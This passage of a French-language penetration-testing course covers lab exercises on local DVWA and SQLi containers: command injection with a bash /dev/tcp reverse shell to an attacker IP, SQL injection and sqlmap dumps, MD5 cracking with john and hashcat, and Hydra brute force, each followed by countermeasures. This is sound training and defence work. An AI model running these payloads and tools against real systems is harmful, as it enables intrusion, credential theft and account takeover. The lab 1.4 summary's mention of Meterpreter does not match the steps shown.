| `WHERE id = '$id'` | **Requêtes préparées PDO** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
| Hash MD5 faible | **bcrypt / argon2** | `password_hash($p, PASSWORD_BCRYPT)` au lieu de `md5($p)` |
| WAF absent | **ModSecurity CRS** | Règle `942100` bloque les signatures SQLi (déjà actif sur le lab WAF J3) |

```bash
# Démonstration : remplacer la requête vulnérable DVWA par une requête préparée PDO
# Dans le code vulnérable : $query = "SELECT * FROM users WHERE user_id = '$id'";
# Le code corrigé devient :
#   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
#   $stmt->execute([$id]);
# 
# Re-tester sqlmap après correction :
# sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --load-cookies=/tmp/dvwa_cookie.txt --batch
# → [CRITICAL] all tested parameters do not appear to be injectable (sqlmap échoue = défense efficace)
```

> **Checkpoint défensif :** Après passage en requêtes préparées, sqlmap ne détecte plus l'injection.

> **📌 À retenir :** On a injecté `' OR '1'='1' #` manuellement puis automatisé l'extraction avec sqlmap — 5 hashs MD5 récupérés en une commande ([T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App).  
> **Attendu :** 5 utilisateurs affichés manuellement + 5 hashs extraits par sqlmap.  
> **Défense :** Requêtes préparées PDO (plus de concaténation SQL) + WAF + bcrypt au lieu de MD5.

---

## Lab 1.4 — Command Injection + Reverse Shell

### Fiche

| Durée | Conteneur | Technique ATT&CK |
|---|---|---|
| 30 min | dvwa :8088 | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |

### Contexte technique

La fonction `shell_exec("ping -c 4 " . $target)` exécute tout ce qui suit `ping`. Avec `;`, on chaîne une deuxième commande. Avec un reverse shell, on obtient un shell interactif complet — plus puissant qu'une simple commande.

### Étape 1 — Command injection basique

DVWA → **Command Injection** :
```bash
127.0.0.1; whoami     → www-data
127.0.0.1; ls /etc/   → contenu de /etc/
127.0.0.1; cat /etc/passwd → utilisateurs
```

### Étape 2 — Reverse shell

**Terminal 1** — écouteur :
```bash
# Écouteur netcat : -l = mode listen (serveur), -v = verbeux, -n = pas de résolution DNS (plus rapide), -p 4444 = port d'écoute
nc -lvnp 4444  # Attend une connexion entrante du reverse shell, donne un prompt interactif une fois connecté
```

**Terminal 2** — via DVWA (remplacer `<KALI_IP>` par l'IP de votre Kali) :
```bash
# Trouve l'IP de l'interface docker0 (passerelle entre l'hôte Kali et les conteneurs Docker)
# ip addr show docker0 = affiche la config réseau, grep 'inet ' = filtre la ligne IPv4
# awk '{print $2}' = extrait l'IP/CIDR, cut -d/ -f1 = retire le masque (/16) pour ne garder que l'IP
# ip = outil moderne de gestion réseau (remplace ifconfig) ; addr show = affiche les adresses IP d'une interface
# awk = langage de traitement de texte ligne par ligne ; '{print $2}' extrait le 2ème champ (séparé par espaces)
# cut -d/ -f1 = découpe la chaîne avec le délimiteur / et garde le 1er champ (retire le masque CIDR)
ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
# → généralement 172.17.0.1  (c'est l'IP que les conteneurs utilisent pour joindre l'hôte Kali)

# Payload dans DVWA Command Injection :
# Décorticage de la commande de reverse shell (morceau par morceau) :
#   1. 127.0.0.1;          → ping localhost (normal), puis le ; enchaîne la 2e commande
#   2. bash -c '...'        → exécute la chaîne entre guillemets dans un sous-shell bash dédié
#   3. bash -i               → lance un shell bash interactif (avec invite de commandes, historique)
#   4. >& /dev/tcp/IP/PORT   → redirige stdout (sortie) ET stderr (erreurs) vers la socket TCP distante
#   5. 0>&1                  → redirige stdin (entrée clavier) vers la même socket
#   Résultat : votre terminal local est connecté à distance au serveur → shell complet
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```

**Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.

### 🔒 Contre-mesure (M1013 + M1018 Execution Prevention)

La command injection se neutralise en **ne passant jamais l'entrée utilisateur à un interpréteur shell** :

| Vulnérabilité | Correction | Code |
|---|---|---|
| `shell_exec("ping " . $input)` | **`escapeshellcmd()` + `escapeshellarg()`** | `$safe = escapeshellarg($input); shell_exec("ping -c 4 " . $safe);` |
| Shell interactif | **Ne pas utiliser `shell_exec()`** | Remplacer par `proc_open()` avec tableau d'arguments (pas de string) |
| Processus shell | **`open_basedir` + `disable_functions`** | Désactiver `system`, `exec`, `passthru`, `shell_exec`, `popen` dans `php.ini` |
| Reverse shell sortant | **Firewall egress filtering** | `ufw default deny outgoing` (ne permettre que les flux légitimes) |

```bash
# Appliquer le principe du moindre privilège : désactiver les fonctions dangereuses dans PHP
docker exec dvwa-target bash -c "
  sed -i 's/disable_functions =.*/disable_functions = system,exec,passthru,shell_exec,popen,proc_open/' /etc/php/*/apache2/php.ini
  apache2ctl restart
"
# Vérification : shell_exec est-il bien désactivé ?
docker exec dvwa-target bash -c "php -r 'echo function_exists(\"shell_exec\") ? \"actif\" : \"inactif\";'"
# → inactif  (shell_exec est bien désactivé)

# Re-tester l'injection de commande :
curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" \
  -b /tmp/dvwa_cookie.txt 2>/dev/null | grep -c "www-data"
# → 0 (whoami ne s'exécute plus : shell_exec est désactivé)
```

> **Checkpoint défensif :** Après `disable_functions`, l'injection de commande et le reverse shell échouent.

> **📌 À retenir :** On a injecté `;whoami` dans un champ `ping` pour exécuter des commandes système, puis obtenu un reverse shell (Meterpreter) avec connexion à distance ([T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution).  
> **Attendu :** shell interactif sur Kali (Meterpreter session 1 ouverte).  
> **Défense :** Désactiver les fonctions système dangereuses (`disable_functions`), valider les entrées (IP), filter les métacaractères (`;`, `|`, `$`).

> **☕ Pause recommandée :** Le Lab 1.5 ci-dessous est le plus long et le plus dense de la journée.
> Prenez 5-10 minutes avant de l'attaquer — vous allez enchaîner injection SQL sur 3 points d'entrée,
> extraction automatisée avec sqlmap, et cracking de mots de passe. Un esprit reposé est plus efficace
> pour analyser les résultats.

---

## Lab 1.5 — SQLi avancée : Trouver, Exploiter, Craquer

### Fiche

| Durée | Conteneur | Dossier | Techniques |
|---|---|---|---|
| 1h | sqli-app (port 8083) | `rendu_labs/jour-01/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |

### Contexte métier

Dans un vrai pentest, 80% du temps est consacré à **trouver** l'injection avant de l'exploiter. Une fois les données exfiltrées, il faut **craquer les hashs** pour prouver l'impact au client. Ce lab vous fait faire les 3 étapes : trouver → exploiter → craquer.

### Contexte technique — Les 3 types d'injection

L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection différents :

| Point d'injection | Type SQL | Difficile à trouver ? | Payload test |
|---|---|---|---|
| `?id=` (paramètre numérique) | Numeric | Facile | `1 OR 1=1` |
| `username` (champ login) | String (single quote) | Moyen | `admin' --` |
| `?filter=` (LIKE) | String (% wildcard) | Difficile | `%' UNION SELECT...` |

**Pourquoi SQLite ?** Les principes d'injection SQL sont identiques quel que soit le SGBD. Seule la syntaxe des commandes système change (version(), @@version, sqlite_version()). SQLite permet un conteneur léger sans MySQL séparé.

### Prérequis

```bash
# Démarre uniquement le conteneur sqli-app (sans reconstruire les autres) en mode détaché
docker compose up -d sqli-app
# Vérification rapide que l'appli web répond (-I = HEAD, ne télécharge que les en-têtes HTTP)
curl -I http://localhost:8083/
# Création du dossier de labs jour-01 et déplacement dedans (&& garantit l'exécution séquentielle)
mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
```

### Étape 1 — Trouver les injections manuellement

**Point 1 : Paramètre `?id=` (numeric)**

```bash
# Requête normale : récupère le produit avec id=1, grep -o extrait uniquement le nom du produit attendu
curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
# → Laptop Pro X  (un seul produit retourné, comportement normal)

# Test SQLi toujours vrai : id=1 OR 1=1 (encodé URL : %20 = espace), grep -c <tr> compte les lignes de tableau
# Si plus d'une ligne → tous les produits sont retournés → injection confirmée
curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
# → 6 (affiche tous les produits au lieu d'un seul)  (la condition OR 1=1 est toujours vraie)

# Test SQLi toujours faux : id=1 AND 1=2 (contradiction logique), grep -o cherche "Aucun" dans la réponse
# Permet de confirmer l'injection sans extraire de données (moins bruyant)
curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
# → Aucun produit trouvé  (la condition AND 1=2 est toujours fausse → aucun résultat)
```

**Point 2 : Formulaire de login (string injection)**

```bash
# Login normal avec mauvais mot de passe : doit retourner "Identifiants incorrects" (comportement attendu)
curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
# →  Identifiants incorrects  (échec normal, l'authentification fonctionne)

# SQLi bypass auth : admin' -- (le -- commente la vérification du password dans la clause WHERE)
# %20 = espace, le guillemet ferme la chaîne, -- neutralise le reste de la requête SQL
curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
# →  Connecté en tant que admin  (bypass réussi, connecté sans connaître le mot de passe)

# SQLi toujours vrai sur le login : ' OR '1'='1' -- force la clause WHERE à être vraie pour toutes les lignes
# grep -c "Connecté" compte le nombre d'utilisateurs connectés → tous les comptes sont retournés
curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
# → 6 (tous les utilisateurs sont "connectés")  (la condition toujours vraie retourne tous les comptes)
```

**Point 3 : Filtre `?filter=` (LIKE injection)**

```bash
# Recherche normale par filtre : retourne l'utilisateur "john", grep <td> filtre les cellules HTML, wc -l les compte
# wc (word count) -l = compte le nombre de lignes reçues en entrée
# Chaque utilisateur occupe 4 cellules (id, username, email, actions) → 4 cellules = 1 utilisateur
curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
# → 4 (4 cellules = 1 ligne utilisateur)  (comportement normal, filtre fonctionnel)

# SQLi UNION sur filtre LIKE : %25' = %' (fermeture du LIKE), UNION SELECT injecte des colonnes d'une autre table
# 1 = placeholder numérique, username/password/email = colonnes de la table users à exfiltrer
curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
# → <td>1</td><td>admin</td>... (les colonnes de la table users sont affichées : injection UNION confirmée)
```

**Checkpoint A :** Les 3 injections fonctionnent. L'application est vulnérable.

### Étape 2 — Exploitation automatisée avec sqlmap

```bash
cd rendu_labs/jour-01

# sqlmap : --tables = énumère toutes les tables de la base, --batch = mode non-interactif (répond oui par défaut)
# 2>&1 redirige stderr vers stdout pour tout capturer, tee sauvegarde la sortie ET l'affiche dans le terminal
sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee sqli_tables.txt
```

Sortie attendue :

```console
[2 tables]
+----------+
| products |
| users    |
+----------+
```

```bash
# sqlmap : -T users = table cible, --columns = énumère toutes les colonnes et leurs types
# Permet de savoir quelles colonnes existent avant de les dumper (username, password, email, role)
sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
```

```console
[5 columns]
+-----------+----------+
| Column    | Type     |
+-----------+----------+
| email     | TEXT     |
| id        | INTEGER  |
| password  | TEXT     |
| role      | TEXT     |
| username  | TEXT     |
+-----------+----------+
```

```bash
# sqlmap : -T users = table, -C username,password,email,role = colonnes à extraire (séparées par des virgules)
# --dump = vide le contenu, --batch = non-interactif, 2>&1 | tee = capture toute la sortie dans sqli_dump.txt
sqlmap -u "http://localhost:8083/?page=search&id=1" \
  -T users -C username,password,email,role --dump --batch 2>&1 | tee sqli_dump.txt
```

Sortie attendue :

```console
+------------+----------------------------------+---------------------+------------+
| username   | password                         | email               | role       |
+------------+----------------------------------+---------------------+------------+
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@shop.local    | admin      |
| john_doe   | 482c811da5d5b4bc6d497ffa98491e38 | john@shop.local     | user       |
| jane_dev   | e99a18c428cb38d5f260853678922e03 | jane@shop.local     | dev        |
| supervisor | 0d107d09f5bbe40cade3de5c71e9e9b7 | super@shop.local    | supervisor |
| guest      | 098f6bcd4621d373cade4e832627b4f6 | guest@shop.local    | user       |
| flag_user  | 21232f297a57a5a743894a0e4a801fc3 | flag@secret.local   | admin      |
+------------+----------------------------------+---------------------+------------+
```

**Checkpoint B :** 6 utilisateurs extraits avec leurs hashs MD5.

### Étape 3 — Craquer les hashs

#### Méthode 1 : john the ripper

```bash
cd rendu_labs/jour-01

# Création du fichier de hashs au format username:hash (une entrée par ligne)
# cat > avec heredoc (<< 'EOF') écrit le contenu multiligne dans hashes.txt
# Les guillemets autour de EOF empêchent l'expansion des variables dans le heredoc
# cat = affiche/concatène le contenu d'un fichier ; cat > fichier = écrit dans le fichier depuis l'entrée standard
# << 'EOF' (heredoc) = écrit tout le texte qui suit jusqu'au marqueur EOF dans le fichier
cat > hashes.txt << 'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
john_doe:482c811da5d5b4bc6d497ffa98491e38
jane_dev:e99a18c428cb38d5f260853678922e03
supervisor:0d107d09f5bbe40cade3de5c71e9e9b7
guest:098f6bcd4621d373cade4e832627b4f6
flag_user:21232f297a57a5a743894a0e4a801fc3
EOF

# Décompression de la wordlist rockyou.txt (la plus utilisée en cracking, ~14 millions de mots de passe)
# 2>/dev/null supprime les erreurs si déjà décompressé, || true évite que la commande échoue
# gunzip = décompresse un fichier .gz (format gzip) — rockyou.txt.gz fait ~140 Mo décompressé
# 2>/dev/null supprime les erreurs si déjà décompressé, || true évite que la commande échoue
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

# Crack avec john : --format=raw-md5 = force le mode MD5 brut (sans sel), --wordlist = dictionnaire utilisé
# 2>/dev/null masque les avertissements (souvent verbeux sur les formats)
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
# Affichage des mots de passe craqués : --show affiche les résultats, --format force le même format
john --show --format=raw-md5 hashes.txt  # Affiche tous les mots de passe déjà trouvés
```

Sortie attendue :

```console
admin:password
john_doe:password123
jane_dev:abc123
supervisor:letmein
guest:test
flag_user:admin
```

#### Méthode 2 : recherche en ligne (optionnelle)

```bash
# Méthode alternative : recherche des hashs dans des bases rainbow tables en ligne (CrackStation, md5decrypt)
# Utile quand john/hashcat ne trouve pas — ces sites pré-calculent les hashs MD5 des mots communs
# CrackStation.net ou md5decrypt.net
# 5f4dcc3b5aa765d61d8327deb882cf99 → password
# e99a18c428cb38d5f260853678922e03 → abc123
# 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
```

#### Méthode 3 : hashcat (si GPU disponible)

```bash
cd rendu_labs/jour-01
# hashcat : -m 0 = mode MD5 (hash type 0), -a 0 = attaque par dictionnaire (straight), --username = ignore la partie user: du fichier
# --force = ignore les avertissements (pilote GPU manquant, matériel non optimal)
hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Checkpoint C :** Au moins 3 mots de passe craqués. Le flag_user utilise `admin` comme mot de passe — une erreur classique.

### Étape 4 — Extraire le flag caché

```bash
cd rendu_labs/jour-01

# Extraction du flag caché dans la table products : -T products = table cible, -C name,secret_flag = colonnes à dumper
# Le champ secret_flag contient le flag CTF à trouver (contient NULL pour les produits sans flag)
sqlmap -u "http://localhost:8083/?page=search&id=1" \
  -T products -C name,secret_flag --dump --batch
```

```console
+---------------------+--------------------------------+
| name                | secret_flag                    |
+---------------------+--------------------------------+
| Laptop Pro X        | FLAG{sql_injection_master}     |
| Smart Monitor 27"   | NULL                           |
| ...                 | NULL                           |
+---------------------+--------------------------------+
```

### Checkpoints

- [ ] Injection trouvée sur les 3 points d'entrée
- [ ] sqlmap a extrait 6 utilisateurs avec hashs
- [ ] john/hashcat a craqué au moins 3 mots de passe
- [ ] Flag `FLAG{sql_injection_master}` trouvé

### 🔒 Contre-mesure (M1013 App Hardening + M1027 Password Policies)

L'application sqli-app a **3 points d'injection**. On corrige les 3 en une seule stratégie : **requêtes préparées PDO partout**. On remplace aussi MD5 par bcrypt pour rendre le cracking inutile.

| Point d'injection | Code vulnérable | Code corrigé |
|---|---|---|
| `?id=` (numeric) | `"SELECT * FROM products WHERE id = $id"` | `$stmt = $db->prepare("SELECT * FROM products WHERE id = ?"); $stmt->execute([$id]);` |
| `username` (login) | `"...WHERE username = '$u' AND password = '$hash'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$u]);` puis `password_verify($p, $hash)` |
| `?filter=` (LIKE) | `"...WHERE username LIKE '%$filter%'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username LIKE ?"); $stmt->execute(["%$filter%"]);` |
| MD5 | `md5($password)` | `password_hash($password, PASSWORD_BCRYPT)` |

```bash
# Appliquer la correction sur le conteneur sqli-app
docker exec sqli-app-target bash -c "
  cd /var/www/html
  # Sauvegarde du fichier vulnérable
  cp index.php index.php.vuln
  # Remplacer les 3 requêtes vulnérables par des requêtes préparées PDO
  sed -i 's/\$db->query(\$query)/\$stmt = \$db->prepare(\"SELECT id, name, price, description FROM products WHERE id = ?\"); \$stmt->execute([(int)\$id]); \$stmt->fetchAll(PDO::FETCH_ASSOC)/' index.php
"
# Re-tester sqlmap après correction :
sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "injectable\|not injectable"
# → all tested parameters do not appear to be injectable (sqlmap échoue : les 3 points d'injection sont neutralisés)
```

> **Checkpoint défensif :** sqlmap ne trouve plus aucune injection. Avec bcrypt, john/hashcat ne peuvent plus craquer les mots de passe en quelques secondes.

> **📌 À retenir :** On a exploité 3 points d'injection SQL (numérique, auth bypass, LIKE) avec sqlmap, craqué les hashs MD5 avec john, et compris pourquoi le hachage salé (bcrypt) protège mieux ([T1190](https://attack.mitre.org/techniques/T1190/)).  
> **Attendu :** 3 injections confirmées + mots de passe craqués en clair.  
> **Défense :** Requêtes préparées PDO, WAF, bcrypt/argon2 pour les mots de passe.

---

## Lab 1.6 — Attaque par force brute avec Hydra

### Fiche

| Durée | Conteneur | Dossier | Technique ATT&CK |
|---|---|---|---|
| 45 min | dvwa (port 8088) | `rendu_labs/jour-01/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |

### Contexte métier

40% des incidents de cybersécurité impliquent des identifiants faibles ou volés (Verizon DBIR 2024). Dans un test de pénétration, l'auditeur teste systématiquement la robustesse des mots de passe contre une attaque par dictionnaire. **Hydra** est l'outil de référence pour automatiser ces tests — utilisé par les pentesters comme par les équipes SOC pour auditer leurs propres annuaires.

**Fonctionnement :** Hydra essaie des couples `login:password` contre un service (HTTP, SSH, FTP...) jusqu'à trouver une correspondance. Le taux de réussite dépend de la qualité de la wordlist.

```mermaid
flowchart LR
    A["Hydra"] -->|"admin:password1"| B["DVWA Login"]
    A -->|"admin:password2"| B
    A -->|"..."| B
    A -->|"admin:password"| B
    B -->|"302 → Login Success"| A
    A -->|"Trouvé : admin:password"| C["Rapport"]
```

**Fig 5d** — Attaque par force brute avec Hydra : itération de couples login:password depuis une wordlist jusqu'à obtenir un `302 Found` (connexion réussie) sur DVWA.

### Prérequis

```bash
cd rendu_labs/jour-01
# Vérifier que le cookie jar DVWA est toujours valide
curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
# → 200  (la session est active, on peut travailler)
```

### Étape 1 — Inspecter le formulaire cible

Avant de lancer Hydra, il faut comprendre la structure du formulaire : méthode HTTP, noms des champs, message d'échec.

```bash
cd rendu_labs/jour-01

# 📌 Récupérer le HTML de la page de login pour identifier les noms des champs
# 🔍 curl -s = mode silencieux, -b = envoie le cookie de session
# 🔍 grep -o 'name="[^"]*"' = extrait chaque attribut name (le motif [^"]* capture tout sauf ")
curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \
  | grep -o 'name="[^"]*"'
# → name="username"  name="password"  name="Login"  (3 champs du formulaire)

# 📌 Identifier le message d'échec : soumettre un mauvais password et capturer l'erreur
# 🔍 grep -oi = insensible à la casse (-i), affiche uniquement la correspondance (-o)
curl -s -b /tmp/dvwa_cookie.txt \
  -d "username=admin&password=mauvais&Login=Login" \
  "http://localhost:8088/login.php" | grep -oi "login failed\|failed"
# → Login failed  (c'est le marqueur d'échec F= qu'Hydra utilisera)
```

### Étape 2 — Lancer Hydra

```bash
cd rendu_labs/jour-01

# 📌 Hydra teste le login admin contre la wordlist rockyou.txt
# 🔍 -l admin = login unique (-l = single login, -L = fichier de logins)
# 🔍 -P = chemin vers la wordlist (rockyou.txt = 14 millions de mots de passe)
# 🔍 http-post-form = module HTTP POST, la chaîne contient 3 parties séparées par :
#   1. "/login.php" = URL du formulaire
#   2. "username=^USER^&password=^PASS^&Login=Login" = champs avec variables
#      ^USER^ et ^PASS^ = remplacés par Hydra à chaque tentative
#   3. "Login failed" = chaîne F= (Fail) détectée dans la réponse pour un échec
# 🔍 -V = verbeux (affiche chaque tentative), -s = port non standard
# 🔍 2>&1 | tee = capture stdout+stderr ET affiche dans le terminal
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 8088 localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 2>&1 \
  | tee hydra_dvwa.txt
```

Sortie attendue :

```console
[8088][http-post-form] host: localhost   login: admin   password: password
[STATUS] attack finished for localhost (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

**Checkpoint :** Hydra a trouvé `password` comme mot de passe admin. En 10 secondes, un mot de passe trivial est compromis.

### Étape 3 — Test multi-logins

```bash
# 📌 Test avec une liste de logins (plus réaliste) : -L = fichier de logins
# Créer une mini wordlist de logins courants
echo -e "admin\ntest\nroot\nuser\nadministrateur" > /tmp/logins.txt

# 🔍 -L = fichier contenant plusieurs logins à tester
# 🔍 -P = wordlist de mots de passe (rockyou.txt)
# 🔍 -F = s'arrêter au premier couple valide trouvé (exit on first find)
# 🔍 -s = port non standard (DVWA sur 8088)
hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
  -s 8088 localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -F 2>&1 \
  | tee hydra_multi.txt
```

Sortie attendue :

```console
[8088][http-post-form] host: localhost   login: admin   password: password
[STATUS] attack finished for localhost (valid pair found)
```

**Checkpoint :** Quel que soit le login testé, Hydra trouve le couple valide `admin:password`. Le mot de passe est le maillon faible.

### 🔒 Contre-mesure (M1036 Account Lockout + M1027 Password Policies)

| Attaque | Défense active | Code de correction |
|---------|----------------|-------------------|
| Brute-force HTTP | **fail2ban** : bannir l'IP après N échecs | `maxretry=5, findtime=600, bantime=900` |
| Wordlist courante | **Politique de mots de passe** | Longueur minimale 12 + complexité (pam_pwquality) |
| Identifiants par défaut | **Changement obligatoire au premier login** | `chage -d 0 <user>` force le changement au prochain login |
| Auth sans limite | **Rate limiting applicatif** | `sleep(1)` après chaque échec, compteur en session |

```bash
# 📌 Installer fail2ban sur le conteneur DVWA
# fail2ban = framework de banissement automatique qui scrute les logs Apache
docker exec dvwa-target bash -c "apt-get update && apt-get install -y fail2ban"

# 📌 Créer une règle fail2ban pour le login DVWA
# 🔍 maxretry = 5 échecs autorisés, findtime = 600s (fenêtre de 10 min)
# 🔍 bantime = 900s (15 min de bannissement)
docker exec dvwa-target bash -c "cat > /etc/fail2ban/jail.local << 'EOF'
[apache-dvwa]
enabled  = true
port     = http,https
filter   = apache-auth
logpath  = /var/log/apache2/error.log
maxretry = 5
findtime = 600
bantime  = 900
EOF
fail2ban-client reload"

# Vérification : la règle est active
docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
# → Status for the jail: apache-dvwa  |  Currently banned: 0  (prêt à bloquer)

# 📌 Re-tester Hydra après fail2ban : après 5 échecs, l'IP est bannie
# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 localhost http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" 2>&1 | head -5
# → [ERROR] target localhost:8088 - connection refused!  (l'IP est bannie)
```

> **Checkpoint défensif :** Avec fail2ban actif, Hydra ne peut plus tester que 5 mots de passe avant le banissement temporaire. Le brute-force est neutralisé à l'échelle réseau.

> **📌 À retenir :** On a brute-forcé le login DVWA avec Hydra et rockyou.txt — `admin:password` trouvé en 10 secondes ([T1110](https://attack.mitre.org/techniques/T1110/) Brute Force).  
> **Attendu :** Mot de passe `password` trouvé pour l'utilisateur `admin`.  
> **Défense :** fail2ban (bloque après 5 échecs), politique de mots de passe robustes (12+ caractères), rate-limiting applicatif.

---

## Synthèse du chapitre

Ce chapitre vous a fait parcourir les **7 phases d'une attaque web complète**, de la conception du plan à la défense :

| Lab | Attaque | Compétence acquise | ATT&CK |
|-----|---------|-------------------|--------|
| 1.0 | Conception | Plan d'attaque ATT&CK Navigator | [TA0043](https://attack.mitre.org/tactics/TA0043/) → [TA0005](https://attack.mitre.org/tactics/TA0005/) |
| 1.1 | Scan + énumération | nmap, gobuster | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance |
| 1.2 | XSS (Reflected + Stored) | Injection JavaScript, vol cookie | [T1189](https://attack.mitre.org/techniques/T1189/) |
| 1.3 | SQLi automatique | sqlmap, dump base | [T1190](https://attack.mitre.org/techniques/T1190/) |
| 1.4 | Command Injection + Reverse Shell | Shell interactif, Meterpreter | [T1203](https://attack.mitre.org/techniques/T1203/) |
| 1.5 | SQLi avancée + Cracking | 3 points d'injection, john | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110](https://attack.mitre.org/techniques/T1110/) |
| 1.6 | Brute-force | Hydra, dictionnaire | [T1110](https://attack.mitre.org/techniques/T1110/) |

**Dans un pentest réel**, ces techniques s'enchaînent : on scanne → on trouve une vulnérabilité → on l'exploite → on extrait des données → on craque les mots de passe. Chaque étape correspond à une tactique ATT&CK et doit être documentée dans le rapport.

**Message clé :** Toutes ces attaques se corrigent avec les bonnes pratiques de code (requêtes préparées, échappement HTML, disable_functions) et les outils de durcissement (WAF, fail2ban, bcrypt). La défense en profondeur combine code sécurisé + périmètre durci + détection.

---

## Dépannage rapide

| Problème | Cause probable | Solution |
|---|---|---|
| `curl: (56) Recv failure: Connection reset` | Conteneur pas encore prêt | `docker compose logs dvwa` pour voir l'avancement, attendre quelques secondes |
| `curl: (7) Failed to connect` | Conteneur non démarré | `docker compose ps` pour vérifier l'état, `docker compose up -d` pour relancer |
| Connexion DVWA : "Login failed" | Session expirée ou cookie corrompu | Relancer : `curl -s -c /tmp/dvwa_cookie.txt -d "username=admin&password=password&Login=Login" "http://localhost:8088/login.php"` |
| `sqlmap` ne trouve aucun paramètre injectable | Cookie invalide ou `security` != low | Vérifier `/tmp/dvwa_cookie.txt` avec `cat /tmp/dvwa_cookie.txt` — doit contenir `security=low` |
| Reverse shell ne se connecte pas | Mauvaise IP ou firewall bloque | `ip addr show docker0` pour trouver l'IP hôte ; `sudo ufw disable` si le firewall local bloque |
| Reverse shell : connexion refusée | Écouteur nc pas lancé | Lancer d'abord `nc -lvnp 4444` **dans un terminal séparé**, **avant** le payload |
| `docker: permission denied` | Utilisateur pas dans le groupe docker | `sudo usermod -aG docker $USER` puis **fermer/rouvrir** la session |
| Port déjà utilisé (8088, 8083...) | Conflit avec service local | `sudo lsof -i :8088` pour identifier le processus, `sudo systemctl stop <service>` |
| `grep: 5` au lieu de `→ 5` | Sortie attendue non formatée | C'est normal — seul le chiffre compte (le commentaire `→` n'est pas produit par grep) |

## Points clés à retenir

- **Planifier avant d'exécuter** : un plan ATT&CK complet guide chaque étape du pentest
- **MITRE ATT&CK** : chaque attaque → ID Txxxx ([T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/))
- Les 14 tactiques couvrent le cycle complet d'une cyberattaque
- **DVWA** expose les 4 familles de vulnérabilités web
- **XSS vole des sessions**, **SQLi vole des données**, **CMDi donne un shell**
- **Reverse shell** : toujours vérifier que la cible peut joindre votre IP Kali (docker0 = 172.17.0.1)

## Pour aller plus loin

- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- TryHackMe : [Jr Penetration Tester Path](https://tryhackme.com/path/jr-penetration-tester) — room [DVWA](https://tryhackme.com/room/dvwa)

---


